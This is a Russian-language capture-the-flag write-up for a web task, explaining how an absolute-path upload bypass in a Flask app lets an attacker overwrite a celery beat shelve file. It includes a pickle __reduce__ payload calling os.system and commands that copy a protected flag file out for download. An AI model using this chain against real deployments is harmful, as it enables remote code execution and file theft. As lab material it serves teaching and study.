# Райтап: uroki (web)

Флаг: `ctfcup{v53_ur0k1_5d3l4ny_5_0gyrc0m_%s}`

## 0. Дано

Электронный журнал на Flask + sqlite. Веб и celery под supervisord, стандартный
набор функций:

- создать урок на произвольные дату и время (`POST /lesson`);
- в назначенное время урок помечается «пройденным» (celery task `flip_lesson`);
- прикрепить файл и скачать его (`POST /lesson/<id>/upload`,
  `GET /lesson/<id>/file`).

## 1. Произвольная запись: обход clean_name

Загрузка вложения (`app/web.py`) выглядит защищённой - имя проходит через
`clean_name()` из `app/storage.py`:

```python
UNSAFE = re.compile(r"\.\.|\\|[\x00-\x1f]")

def clean_name(name):
    name = (name or "").strip()
    if UNSAFE.search(name):
        name = os.path.basename(name.replace("\\", "/"))
    ...
```

`..` и обратные слэши отрезаются, но абсолютный путь регуляркой не
покрывается. Дальше:

```python
def save_attachment(folder, file):
    path = os.path.join(folder, clean_name(file.filename))
```

`os.path.join("/data/uploads", "/data/something")` отбрасывает первый
аргумент - итого можно просто передать полный путь к файлу.

## 2. Планировщик и рестарт воркера

Задачи по расписанию делает celery beat, встроенный в worker (`worker -B`).
Из необычного остаётся только класс планировщика в конфиге celery в
`app/tasks.py`:

```python
beat_scheduler="app.scheduler:JournalScheduler",
```

`JournalScheduler` (`app/scheduler.py`) - наследник стокового
`PersistentScheduler`. У него расписание живёт в файле `shelve`
(а `shelve` - это `pickle`). Имя файла берётся из
дефолта `beat_schedule_filename = "celerybeat-schedule"`
относительно cwd воркера, а воркер в `supervisord.conf` запущен с
`directory=/data`.
Итого состояние лежит в `/data/celerybeat-schedule`. Стоковый `setup_schedule()`
на каждом старте:

```python
self._store = self._open_schedule()  # shelve.open(...)
self._create_schedule()  # self._store['entries'] -> pickle.loads(...)
```

Каждый запланированный урок - обычная beat-запись с crontab на нужную минуту
(`_load_lessons_from_sqlite`).

Создание урока в вебе вызывает `ops.apply_schedule_changes()`
(в `app/ops.py` это `supervisorctl restart celery`), чтобы новая запись
подхватилась:

```python
lid = db.create_lesson(...)
ops.apply_schedule_changes()
```

Итог: записью в `/data/celerybeat-schedule` можно получить исполнение кода при
следующем рестарте.

## 3. Нагрузка

Формат файла - gdbm (один файл без суффикса). Пейлоад - объект с
`__reduce__` под ключом `entries`. Собирать надо в том же образе, в котором
запускается таск (та же версия python и dbm):

```python
import os, shelve

class Run:
    def __reduce__(self):
        return (os.system, (command,))

db = shelve.open("/out/celerybeat-schedule")
db["entries"] = Run()
db.close()
```

## 4. Чтение флага

Копируем флаг в файл, который потом читаем через веб.

Флаг после старта закрыт даже для владельца: entrypoint выставляет `/flag.txt`
права `0000`, владелец `app` (в раздатке этого нет, это можно вскрыть, имея
RCE). Чтение - через chmod от владельца:

```
chmod 0444 /flag.txt
cat /flag.txt > /data/uploads/leak
chmod 644 /data/uploads/leak
```

Файл `leak` заранее можно прикрепить к уроку и скачать через
`GET /lesson/<id>/file`.

## 5. Воркер держит файл

Воркер держит `celerybeat-schedule` открытым. Перезапись из-под живого процесса портит
gdbm (`Database needs recovery`), поэтому нагрузка работает не с первого
рестарта. После пары неудачных стартов воркер переходит в FATAL, файл
освобождается, следующий старт читает уже чистую нагрузку.

Цикл на попытку: заменить `celerybeat-schedule`, создать урок (рестарт), скачать
вложение. Несколько попыток, обычно хватает двух.

## Решение

```bash
python3 exploit.py http://localhost:5000
# [+] flag: ctfcup{v53_ur0k1_5d3l4ny_5_0gyrc0m_...}
```
